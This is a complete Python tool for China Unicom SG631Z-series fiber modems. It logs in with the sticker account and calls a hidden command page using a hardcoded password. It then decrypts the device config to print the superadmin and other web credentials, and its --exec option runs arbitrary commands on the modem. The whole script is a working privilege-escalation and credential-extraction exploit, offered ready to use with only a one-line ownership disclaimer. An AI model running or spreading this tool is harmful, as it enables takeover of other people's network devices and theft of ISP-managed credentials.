#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
sg631z.py —— 锐捷 / 星网锐捷 SG631Z 系列联通光猫超级账户提取（只读）

适用：使用 hidden_cmd.gch + sidbg 的 SG631Z / SG631Z-C / 吉比特等同类固件。
原理：用光猫背面贴纸上的普通账户登录 Web，进入隐藏命令页，调用设备自带的
      sidbg 解密配置库，读出 DevAuthInfo 表里的 Web 账户（含超级管理员）。
     全程只读取配置，不修改任何设置。

依赖：Python 3.8+，纯标准库（内置 AES-128-CBC，无需 pip install）。

⚠️ 仅限在你本人拥有管理权限的设备上使用。未经授权使用属违法行为。
"""
from __future__ import annotations

import argparse
import base64
import getpass
import html
import http.cookiejar
import json
import os
import re
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

__version__ = "1.0.0"

DEFAULT_HOST = "192.168.1.1"
DEFAULT_USER = "user"
DEFAULT_SU_PASS = "aDm8H%MdA"          # 隐藏命令页的 pwd
CONFIG_XML = "/userconfig/cfg/db_user_cfg.xml"
DECRY_FILE = "/tmp/debug-decry-cfg"
AES_KEY = b"1111111111111111"
AES_IV = b"0000000000000000"
UA = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36"

# ────────────────────────────── 纯 Python AES-128 ──────────────────────────────
# 只实现加密方向（CBC + PKCS#7），够登录用。标准 FIPS-197 实现。

SBOX = (
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16,
)
RCON = (0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36)


def _xtime(a: int) -> int:
    a <<= 1
    if a & 0x100:
        a ^= 0x11b
    return a & 0xff


def _expand_key(key: bytes):
    """返回 11 组轮密钥，每组 16 字节（列主序，与状态数组下标一致）。"""
    w = [list(key[i * 4:i * 4 + 4]) for i in range(4)]
    for i in range(4, 44):
        t = list(w[i - 1])
        if i % 4 == 0:
            t = t[1:] + t[:1]
            t = [SBOX[b] for b in t]
            t[0] ^= RCON[i // 4 - 1]
        w.append([w[i - 4][j] ^ t[j] for j in range(4)])
    return [bytes(sum(w[4 * r:4 * r + 4], [])) for r in range(11)]


def _encrypt_block(block: bytes, rk) -> bytes:
    s = list(block)                       # 下标 r + 4*c（列主序）
    rk0 = rk[0]
    for i in range(16):
        s[i] ^= rk0[i]
    for rnd in range(1, 11):
        s = [SBOX[b] for b in s]
        # ShiftRows：第 r 行循环左移 r
        s = [s[(i % 4) + 4 * ((i // 4 + (i % 4)) % 4)] for i in range(16)]
        if rnd != 10:
            for c in range(4):
                a0, a1, a2, a3 = s[4 * c:4 * c + 4]
                t = a0 ^ a1 ^ a2 ^ a3
                s[4 * c + 0] = a0 ^ t ^ _xtime(a0 ^ a1)
                s[4 * c + 1] = a1 ^ t ^ _xtime(a1 ^ a2)
                s[4 * c + 2] = a2 ^ t ^ _xtime(a2 ^ a3)
                s[4 * c + 3] = a3 ^ t ^ _xtime(a3 ^ a0)
        rk_n = rk[rnd]
        for i in range(16):
            s[i] ^= rk_n[i]
    return bytes(s)


def aes_cbc_encrypt_b64(text: str) -> str:
    """等价于前端的 CryptoJS.AES.encrypt(text, Utf8(key), {iv: Utf8(iv), CBC, Pkcs7}).toString()"""
    data = text.encode("utf-8")
    pad = 16 - len(data) % 16
    data += bytes([pad]) * pad
    rk = _expand_key(AES_KEY)
    prev = AES_IV
    out = bytearray()
    for i in range(0, len(data), 16):
        blk = bytes(a ^ b for a, b in zip(data[i:i + 16], prev))
        prev = _encrypt_block(blk, rk)
        out += prev
    return base64.b64encode(bytes(out)).decode("ascii")


def selftest() -> bool:
    """FIPS-197 附录 C.1 标准向量 + CBC 往返对照。"""
    key = bytes(range(16))
    pt = bytes.fromhex("00112233445566778899aabbccddeeff")
    rk = _expand_key(key)
    ok = _encrypt_block(pt, rk).hex() == "69c4e0d86a7b0430d8cdb78070b4c55a"
    return ok


# ────────────────────────────── 日志 ──────────────────────────────

_T0 = time.time()
_LOG_STREAM = sys.stdout


def log(tag: str, msg: str) -> None:
    print("[%s] %-5s %s" % (time.strftime("%H:%M:%S"), tag, msg),
          file=_LOG_STREAM, flush=True)


# ────────────────────────────── HTTP 会话 ──────────────────────────────

def _decode(raw: bytes, ctype: str = "") -> str:
    m = re.search(r"charset=([\w-]+)", ctype or "", re.I)
    encs = [m.group(1)] if m else []
    encs += ["utf-8", "gbk", "gb18030"]
    for enc in encs:
        try:
            return raw.decode(enc)
        except (UnicodeDecodeError, LookupError):
            continue
    return raw.decode("utf-8", "replace")


class Session:
    def __init__(self, host: str, timeout: float = 8.0):
        self.base = "http://%s/" % host
        self.timeout = timeout
        cj = http.cookiejar.CookieJar()
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        self.op.addheaders = [("User-Agent", UA), ("Referer", self.base)]

    def _open(self, path: str, data: bytes | None = None):
        url = self.base + path
        headers = {"Referer": self.base}
        if data is not None:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=data, headers=headers)
        try:
            with self.op.open(req, timeout=self.timeout) as r:
                return r.status, r.geturl(), _decode(r.read(), r.headers.get("Content-Type", ""))
        except urllib.error.HTTPError as e:
            return e.code, url, _decode(e.read() or b"", (e.headers or {}).get("Content-Type", ""))

    def get(self, path: str):
        return self._open(path)

    def post(self, path: str, fields: dict):
        return self._open(path, urllib.parse.urlencode(fields).encode())


def _hidden_input(page: str, name: str) -> str:
    m = re.search(r'name="%s"[^>]*value="([^"]*)"' % re.escape(name), page)
    return m.group(1) if m else ""


def login(s: Session, user: str, pw: str):
    """登录 Web，返回 (ok, right)。自动区分普通用户门户 / cu.html 管理员门户。"""
    path = "cu.html" if user.strip().lower() == "cuadmin" else ""
    st, url, page = s.get(path)
    if st != 200:
        log("WARN", "登录页 HTTP %d" % st)
        return False, None
    m = re.search(r'Frm_Logintoken"\)\.value\s*=\s*"(\d+)"', page)
    token = m.group(1) if m else "6"
    fields = {
        "_lang": "", "frashnum": "", "action": "login", "Frm_Logintoken": token,
        "csrf_token": _hidden_input(page, "csrf_token"),
        "session_token": _hidden_input(page, "session_token"),
        "username": aes_cbc_encrypt_b64(user),
        "logincode": aes_cbc_encrypt_b64(pw),
        "ieversion": "1",
    }
    st, url, page = s.post(path, fields)
    if st != 200:
        log("WARN", "登录请求 HTTP %d" % st)
        return False, None
    if 'name="logincode"' in page or "menu.gch" not in url:
        return False, None
    m = re.search(r"var\s+Right\s*=\s*(\d+)", page)
    return True, int(m.group(1)) if m else None


# ────────────────────────────── 隐藏命令页 ──────────────────────────────

class CmdChannel:
    """hidden_cmd.gch?pwd=... 的封装：POST submit_cmds → 取 cmd_result。"""

    def __init__(self, s: Session, su_pass: str):
        self.s = s
        self.path = "hidden_cmd.gch?pwd=" + urllib.parse.quote(su_pass, safe="")

    def available(self):
        st, _, page = self.s.get(self.path)
        return st == 200 and "input_cmd" in page and "cmd_result" in page

    def run(self, cmd: str) -> str:
        # 页面里的 cmdSubmmit() 会把换行替换成空格再提交
        cmd = cmd.replace("\r", " ").replace("\n", " ")
        st, _, page = self.s.post(self.path, {"submit_cmds": cmd, "IF_ACTION": "ExecuteCommand"})
        if st != 200:
            raise RuntimeError("命令页 HTTP %d" % st)
        m = re.search(r'<textarea[^>]*id="?cmd_result"?[^>]*>(.*?)</textarea>', page, re.S)
        return html.unescape(m.group(1)) if m else ""


# ────────────────────────────── 业务 ──────────────────────────────

def parse_users(text: str):
    users = []
    for row in re.findall(r"<Row\b[^>]*>(.*?)</Row>", text, re.S | re.I):
        d = dict(re.findall(r'<DM\s+name="([^"]+)"\s+val="([^"]*)"', row))
        if d.get("User"):
            users.append(d)
    if not users:
        # 输出被截断 / 单行 XML 时的兜底：按出现顺序配对
        for u, p in re.findall(
                r'name="User"\s+val="([^"]*)".*?name="Pass"\s+val="([^"]*)"', text, re.S):
            users.append({"User": u, "Pass": p})
    return users


def decrypt_config(ch: CmdChannel):
    last = ""
    for tool in ("sidbg", "sendcmd"):
        cmd = ("%s 1 DB decry %s; "
               "sed -n '/DevAuthInfo/,/<\\/Tbl>/p' %s | head -c 12000"
               % (tool, CONFIG_XML, DECRY_FILE))
        out = ch.run(cmd)
        last = out
        if '<DM name="User"' in out or "DevAuthInfo" in out:
            return out
        # 兜底 2：grep
        out = ch.run("%s 1 DB decry %s; grep -A 40 DevAuthInfo %s | head -c 12000"
                     % (tool, CONFIG_XML, DECRY_FILE))
        last = out
        if '<DM name="User"' in out or "DevAuthInfo" in out:
            return out
        if re.search(r"not found|No such|permission denied", out, re.I):
            continue
    return last


def tcp_open(host: str, port: int, timeout: float) -> bool:
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        return True
    except OSError:
        return False
    finally:
        s.close()


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        prog="sg631z.py",
        description="SG631Z 系列联通光猫超级账户提取（只读）",
        epilog="示例：python3 sg631z.py -H 192.168.1.1 -u user -p '贴纸密码'")
    ap.add_argument("-H", "--host", default=None, help="光猫地址，默认 %s" % DEFAULT_HOST)
    ap.add_argument("-u", "--user", default=None, help="普通账户，默认 %s" % DEFAULT_USER)
    ap.add_argument("-p", "--password", default=None, help="普通账户密码（不填则交互输入）")
    ap.add_argument("--su-pass", default=DEFAULT_SU_PASS,
                    help="hidden_cmd.gch 的 pwd 参数，默认 aDm8H%%MdA")
    ap.add_argument("--verify", action="store_true", help="用找到的管理员账户再登录一次验证（仅 1 次）")
    ap.add_argument("--exec", dest="exec_cmd", default=None, help="只执行一条隐藏命令并打印输出")
    ap.add_argument("--json", action="store_true", help="以 JSON 输出结果")
    ap.add_argument("--no-clean", action="store_true", help="保留设备上的解密临时文件")
    ap.add_argument("--timeout", type=float, default=8.0, help="网络超时秒数，默认 8")
    ap.add_argument("--selftest", action="store_true", help="运行内置 AES 自检后退出")
    ap.add_argument("-V", "--version", action="version", version="%(prog)s " + __version__)
    a = ap.parse_args(argv)
    if a.json:
        global _LOG_STREAM
        _LOG_STREAM = sys.stderr      # 保证 stdout 只有 JSON

    if a.selftest:
        ok = selftest()
        print("AES-128 FIPS-197 自检：%s" % ("通过" if ok else "失败"))
        return 0 if ok else 1

    print(file=_LOG_STREAM)
    print("  ※ 普通账户和密码印在光猫背面贴纸上，形如：用户名 user / 密码 xxxxxxxx",
          file=_LOG_STREAM)
    print(file=_LOG_STREAM)

    host = (a.host or input("① 光猫地址 [%s]: " % DEFAULT_HOST).strip() or DEFAULT_HOST)
    user = (a.user or input("② 用户名 [%s]: " % DEFAULT_USER).strip() or DEFAULT_USER)
    if a.password is not None:
        pw = a.password.rstrip("\r\n")
    else:
        if sys.stdin.isatty():
            pw = getpass.getpass("③ 密码（输入不显示）: ").rstrip("\r\n")
        else:
            pw = input("③ 密码: ").rstrip("\r\n")
    if not pw:
        log("WARN", "密码为空，退出")
        return 1

    log("INFO", "目标 %s  账户 %s" % (host, user))
    if not tcp_open(host, 80, a.timeout):
        log("WARN", "TCP 80/%s 不可达：检查是否连在光猫 LAN 上、地址是否正确" % host)
        return 2

    s = Session(host, a.timeout)
    ok, right = login(s, user, pw)
    if not ok:
        log("WARN", "Web 登录失败。注意：连续 3 次失败会触发延时锁定，请勿反复尝试。")
        log("HINT", "确认用的是背面贴纸上的普通账户；密码错误时请等 10~30 分钟再试")
        return 3
    log("OK", "Web 登录成功（Right=%s）" % right)

    ch = CmdChannel(s, a.su_pass)
    if not ch.available():
        log("WARN", "hidden_cmd.gch 不可用：该固件可能不是 SG631Z 同类，或 pwd 已被改动")
        log("HINT", "可用 --su-pass 指定其它 pwd；非锐捷/吉比特固件不在本脚本支持范围")
        return 4
    log("OK", "隐藏命令页可用")

    try:
        if a.exec_cmd:
            out = ch.run(a.exec_cmd)
            print(out)
            return 0

        log("INFO", "解密配置库（只读）…")
        out = decrypt_config(ch)
        users = parse_users(out)
        if not users:
            log("WARN", "未解析到 DevAuthInfo 账户表")
            log("HINT", "设备原始输出如下（前 800 字符）：")
            print(out[:800])
            return 5
    finally:
        if not a.no_clean:
            try:
                ch.run("rm -f %s" % DECRY_FILE)
                log("INFO", "已删除设备上的解密临时文件")
            except Exception:
                pass

    level_name = {"1": "管理员", "2": "普通用户"}
    for u in users:
        u["level_name"] = level_name.get(u.get("Level", ""), u.get("Level", "?"))

    if a.json:
        print(json.dumps(users, ensure_ascii=False, indent=2))
    else:
        print()
        print("  %-14s %-26s %s" % ("用户名", "密码", "级别"))
        print("  " + "-" * 62)
        for u in users:
            print("  %-14s %-26s %s" % (u["User"], u.get("Pass", ""), u["level_name"]))
        print()

    admin = next((u for u in users if u.get("Level") == "1"), None)
    if admin:
        log("OK", "超级账户：%s / %s" % (admin["User"], admin.get("Pass", "")))
        log("HINT", "管理员入口 http://%s/cu.html（不是首页的“其它账户”）" % host)
        if a.verify:
            s2 = Session(host, a.timeout)
            vok, vright = login(s2, admin["User"], admin.get("Pass", ""))
            if vok and vright == 1:
                log("OK", "管理员账户验证通过")
            else:
                log("WARN", "管理员账户验证未通过（可能刚被 TR-069 轮换）")
    else:
        log("WARN", "配置里没有 Level=1 的账户，可能超密尚未下发")
    log("INFO", "完成，用时 %.1fs" % (time.time() - _T0))
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print()
        sys.exit(130)
